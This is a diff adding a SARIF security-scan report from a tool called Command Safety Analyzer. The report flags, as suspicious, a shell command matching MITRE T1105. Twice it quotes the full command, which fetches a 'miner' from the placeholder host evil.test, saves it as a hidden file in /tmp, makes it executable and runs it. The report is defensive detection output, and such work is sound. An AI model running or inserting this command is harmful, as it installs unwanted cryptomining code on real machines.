@@ -1,0 +1,66 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Command Safety Analyzer",
+          "version": "4.1",
+          "informationUri": "https://github.com/command-safety-analyzer",
+          "rules": [
+            {
+              "id": "T1105",
+              "name": "静态分析",
+              "shortDescription": {
+                "text": "命令匹配恶意模式: download to /tmp and make executable"
+              },
+              "helpUri": "https://attack.mitre.org/techniques/T1105",
+              "properties": {
+                "tags": [
+                  "security",
+                  "command-safety",
+                  "mitre/T1105"
+                ]
+              },
+              "help": {
+                "text": "MITRE ATT&CK: T1105 (Ingress Tool Transfer)"
+              }
+            }
+          ],
+          "properties": {
+            "verdict": "SUSPICIOUS",
+            "risk_score": 35,
+            "confidence": "LOW"
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "T1105",
+          "level": "error",
+          "message": {
+            "text": "命令匹配恶意模式: download to /tmp and make executable"
+          },
+          "properties": {
+            "risk_score": 35,
+            "dimension": "静态分析",
+            "evidence": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "properties": {
+            "command": "curl -fsSL http://evil.test/miner -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
+            "verdict": "SUSPICIOUS",
+            "risk_score": 35,
+            "confidence": "LOW",
+            "timestamp": "2026-03-20T04:02:58.676995+00:00"
+          }
+        }
+      ]
+    }
+  ]
+}
